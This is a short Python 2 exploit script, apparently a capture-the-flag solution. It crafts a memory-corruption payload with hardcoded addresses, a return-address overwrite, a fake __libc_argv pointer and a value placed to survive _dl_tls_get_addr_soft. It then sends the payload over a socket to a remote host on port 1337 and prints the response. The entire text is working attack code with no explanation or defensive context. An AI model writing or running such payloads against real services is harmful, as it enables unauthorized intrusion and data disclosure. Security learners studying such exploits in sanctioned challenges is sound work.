import sys, struct, socket, time

def pack64(x):
    return struct.pack('<Q', x)

p='a'*2000

loc = 0x6b73e0
rip = 0x4359d9

payload = bytearray(str(p)[:0xc20])

payload[1616:1616+8] = pack64(loc - 0x73*8)

payload[0:8] = pack64(0)

payload[1736:1736+8] = pack64(loc + 0x10 - 0x73*4)
payload[476:476+8] = pack64(rip)

# fake __libc_argv
payload[0x5a0:0x5a0+8] = pack64(loc + 0x5a8)
payload[0x5a8:0x5a8+8] = pack64(0x6b4040)

# to survive _dl_tls_get_addr_soft
payload[1088:1088+8] = pack64(loc)
payload[8:16] = pack64(loc)

s = socket.create_connection(('35.198.130.245', 1337))
s.sendall(payload + '\n')
time.sleep(1)
print s.recv(4096)
